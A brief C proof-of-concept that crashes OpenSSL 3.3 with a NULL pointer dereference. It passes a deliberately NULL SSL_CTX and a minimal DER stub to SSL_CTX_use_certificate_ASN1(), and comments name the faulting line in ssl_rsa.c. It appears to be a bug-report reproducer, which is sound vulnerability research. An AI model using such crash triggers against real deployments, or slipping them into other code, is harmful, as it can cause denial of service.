/*
 * PoC: SF04 — NULL pointer dereference in SSL_CTX_use_certificate_ASN1()
 * Target: OpenSSL 3.3 (openssl33/ssl/ssl_rsa.c)
 *
 * Trigger: call SSL_CTX_use_certificate_ASN1(NULL, len, data)
 * Crash:   ssl_rsa.c:348 — X509_new_ex(ctx->libctx, ctx->propq) with NULL ctx
 */

#include <openssl/ssl.h>
#include <openssl/err.h>
#include <stdio.h>

int main(void)
{
    OPENSSL_init_ssl(0, NULL);

    /* Minimal DER-encoded X.509 stub (intentionally malformed; crash happens
     * before any parsing because ctx->libctx is dereferenced first). */
    static const unsigned char der[] = { 0x30, 0x00 };

    /*
     * SSL_CTX_use_certificate_ASN1() does not check ctx before dereferencing
     * ctx->libctx and ctx->propq at line 348 inside X509_new_ex().
     */
    SSL_CTX *ctx = NULL;   /* intentionally NULL */
    SSL_CTX_use_certificate_ASN1(ctx, (int)sizeof(der), der);  /* crash here */

    return 0;
}
